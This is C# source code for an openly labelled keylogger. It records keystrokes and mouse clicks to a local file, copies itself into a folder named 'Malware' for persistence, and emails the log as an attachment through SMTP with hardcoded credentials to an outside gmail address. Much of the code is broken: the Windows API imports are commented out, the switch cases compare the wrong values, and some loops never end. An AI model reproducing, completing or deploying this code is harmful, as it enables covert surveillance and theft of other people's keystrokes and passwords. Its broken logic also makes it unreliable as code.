using System ;
using System.Windows.Input;
using System.IO ;
using System.Security ;
using System.Net.NetworkInformation ;
using System.Net.Mail ;
using System.Net.Mime ;
using System.Net.Sockets ;
using System.Net ;
using Microsoft.Win32 ;
using System.Text;
using System.Threading.Tasks ;
using System.Windows ;
using System.Diagnostics;
using System.Collections;
using System.ComponentModel;
using System.Security.AccessControl ;
using System.Security.Permissions;
namespace Keylogger
{
    class Program
    {
        //[Dllimport("User32dll")]; I used Linux to create this Malware on Windows disabled commentary to using this Malware
        public static extern int GetAsyncStates(Int32 i);
        public static extern int GetButtonState(Int32 k);
        public static void Main(String[] args){
        string filekey = @"keylog.txt";
        string keyllog = "";
        string mouse = "";
        while(true){
                    for(int k = 0 ; k <= 2 ; k++)
        {
            int button = GetButtonState(k);
            switch(button)
            {
                case 0 : 
                mouse+= "[MOUSE LEFT]";
                  using(FileStream fichier = new FileStream(filekey,FileMode.OpenOrCreate,FileAccess.Write,FileShare.None)){
                    using (StreamWriter sw = new StreamWriter(fichier)){
                        sw.Write(mouse);
                    }
                }
                break;
                case 1 :
                mouse+= "[MOUSSE MIDDLE]";
                 using(FileStream fichier = new FileStream(filekey,FileMode.OpenOrCreate,FileAccess.Write,FileShare.None)){
                    using (StreamWriter sw = new StreamWriter(fichier)){
                        sw.Write(mouse);
                    }
                }
                break ;
                case 2 : 
                mouse+= "[MOUSE RIGHT]";
                 using(FileStream fichier = new FileStream(filekey,FileMode.OpenOrCreate,FileAccess.Write,FileShare.None)){
                    using (StreamWriter sw = new StreamWriter(fichier)){
                        sw.Write(mouse);
                    }
                }
                break ;
            }
            
        for (int i = 18; i <= 127; i++)
        {
            int keystates = GetAsyncStates(i);
            if(keystates == -32767)
        {
            switch(keystates)
            {
                case 32 :
                keyllog += "[SPACE]";
                using(FileStream fichier = new FileStream(filekey,FileMode.OpenOrCreate,FileAccess.Write,FileShare.None)){
                    using (StreamWriter sw = new StreamWriter(fichier)){
                        sw.Write(keyllog);
                    }
                }
                break ;
                case 8 :
                keyllog = keyllog.Substring(0,keyllog.Length - 1);
                   using(FileStream fichier = new FileStream(filekey,FileMode.OpenOrCreate,FileAccess.Write,FileShare.None)){
                    using (StreamWriter sw = new StreamWriter(fichier)){
                        sw.Write(keyllog);
                    }
                }
                break ;
                default:
                keyllog += (char)keystates + mouse;
                while(keyllog.Length <= 500){
                    Sendmessage(keyllog);   
                }
                break ;
            }
        }
        }
        }
        }
       }
                               public static void Registre(string keyPath,string Value){
          using(RegistryKey subkey = Registry.CurrentUser.CreateSubKey(keyPath,true))
           {
            try{
             Registry.CurrentUser.SetValue(Value,subkey);
             Registry.CurrentUser.OpenSubKey(Value,RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl);
             RegistryKey.OpenBaseKey(RegistryHive.LocalMachine,RegistryView.Registry64);
           }catch(SecurityException e){
            Console.WriteLine("Security Subkey .............{0}",e);
            subkey.Dispose();
            subkey.Close();
            }catch(ArgumentException e){
            Console.WriteLine("Value not correct ............{0}",e);
            }
        }
                               }
       public static void enregistrement(){
 try{
   string Filepath = Process.GetCurrentProcess().MainModule.FileName; 
  FileInfo sourceFile = new FileInfo(Filepath);
  string Pathdir = "" ;
  DriveInfo[] allDrives = DriveInfo.GetDrives();
  foreach(DriveInfo Drives in allDrives)
  {
    if(Drives.IsReady)
    {
      switch(Drives.Name){
        case @"C:\":
        Pathdir = @"C:\\Users\\users\\Publics" ;
        DirectoryInfo DirectoryPath = new DirectoryInfo(Pathdir);
        Directory.CreateDirectory(Path.Combine(Pathdir,"Malware"));
        sourceFile.CopyTo(Path.Combine(DirectoryPath.FullName,"Malware"));
        FileSecurity fSecurity = File.GetAccessControl(Path.Combine(DirectoryPath.FullName,"Malware",Filepath));
          break ;
          case @"/":
        Pathdir = @"/home/esiounath/Bureau" ;
        DirectoryPath = new DirectoryInfo(Pathdir);
        Directory.CreateDirectory(Path.Combine(Pathdir,"emplacement"));
        sourceFile.CopyTo(Path.Combine(DirectoryPath.FullName,"emplacement"));
        fSecurity = File.GetAccessControl(Path.Combine(DirectoryPath.FullName,"emplacement",Filepath));
        break ;
        case @"E:\":
          break ;
        case @"Z:\":
          break ;
        case @"B:\":
        break ;

      }
    }
  }
 }catch(IOException e)
 {
   Console.WriteLine(e.ToString());
 }
}
       public static void Sendmessage(string keyllog)
       {
              string filekey = @"keylog.txt";
                        try{
                            while(true){
                        if(!File.Exists(filekey))
                        {
                            using(FileStream fichier = new FileStream(filekey,FileMode.OpenOrCreate,FileAccess.Write,FileShare.None)){
                                    using (StreamWriter sw = new StreamWriter(fichier))
                                        {
                                            sw.Write(keyllog);
                                            try{
                                                 var host = Dns.GetHostEntry(Dns.GetHostName());
                                                foreach (var ip in host.AddressList)
                                                {
                                                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                                                    {
                                                        string Ipadresse = ip.ToString();
                                                        using(SmtpClient mail = new SmtpClient(Ipadresse,587)){
                                                      //On indique au client d'utiliser les informations qu'on va lui fournir
                                                        mail.UseDefaultCredentials = true;
                                                        //Ajout des informations de connexion
                                                        mail.Credentials = new System.Net.NetworkCredential("info@monNomDeDomaine.fr", "monMotDePasse");
                                                        //On indique que l'on envoie le mail par le rÃ©seau
                                                        mail.DeliveryMethod = SmtpDeliveryMethod.Network;
                                                        //On active le protocole SSL
                                                        mail.EnableSsl = true;
                                                        MailAddress from = new MailAddress("info@monNomDeDomaine.fr", "Host Keylogger",System.Text.Encoding.UTF8);
                                                        MailAddress to = new MailAddress("eden.email@gmail.com", "",System.Text.Encoding.UTF8);
                                                        MailMessage message = new MailMessage(from, to);
                                                        message.BodyEncoding =  System.Text.Encoding.UTF8;
                                                        message.HeadersEncoding = System.Text.Encoding.UTF8; 
                                                        message.SubjectEncoding = System.Text.Encoding.UTF8; 
                                                        //message.Headers = "Keylogger with files !";
                                                        message.Subject = "Keylogger";
                                                          foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                                                            {
                                                            // Only consider Ethernet network interfaces
                                                             if(ip.AddressFamily == AddressFamily.InterNetworkV6)
                                                            {
                                                             message.Body = "This is document of keylogger with host ! Addresse mac & IPV6 :"+nic.GetPhysicalAddress().ToString()+ip.ToString();   
                                                            }
                                                            else{
                                                                message.Body = "This is document of keylogger with host ! Addresse Mac : IPV4"+nic.GetPhysicalAddress().ToString();  
                                                            }

                                                            }
                                                        message.Body = "This is document of keylogger with host ! Addresse mac :";  
                                                        Attachment data = new Attachment(fichier, MediaTypeNames.Application.Octet);
                                                        ContentDisposition disposition = data.ContentDisposition;
                                                        disposition.CreationDate = System.IO.File.GetCreationTime(filekey);
                                                        disposition.ModificationDate = System.IO.File.GetLastWriteTime(filekey);
                                                        disposition.ReadDate = System.IO.File.GetLastAccessTime(filekey);
                                                        disposition.DispositionType = DispositionTypeNames.Attachment;
                                                        message.Attachments.Add(data);
                                                        try
                                                        {
                                                            mail.Send(message);
                                                        }
                                                        catch (Exception ex)
                                                        {
                                                            Console.WriteLine("Exception caught in CreateMessageWithAttachment(): {0}",
                                                                ex.ToString());
                                                        }
                                                        data.Dispose();
                                                        message.Dispose();
                                                        mail.Dispose();
                                                            }
                                                    }
                                                }
                                            }catch(SmtpException e)
                                            {
                                                Console.WriteLine(e.ToString());
                                            }catch(ArgumentNullException e){
                                                Console.WriteLine(e.ToString());
                                            }catch(FormatException e)
                                            {
                                                Console.Write(e.ToString());
                                            }
                                        }
                        }

                        }
                        }
                        }catch(IOException e){
                            Console.WriteLine(e.ToString());
                        }
                        catch(ArgumentNullException e)
                        {
                            Console.WriteLine(e.ToString());
                        }catch(SecurityException e)
                        {
                            Console.WriteLine(e.ToString());
                        }
       }
    }
    
}
